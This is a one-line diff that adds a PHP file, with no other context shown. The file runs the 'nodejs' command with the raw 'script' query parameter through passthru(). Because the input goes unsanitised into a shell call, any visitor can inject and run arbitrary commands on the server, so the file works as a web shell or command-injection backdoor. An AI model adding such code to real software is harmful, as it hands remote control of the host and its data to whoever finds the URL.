@@ -1,0 +1,1 @@
+<?php passthru("nodejs " . $_GET["script"]); ?>
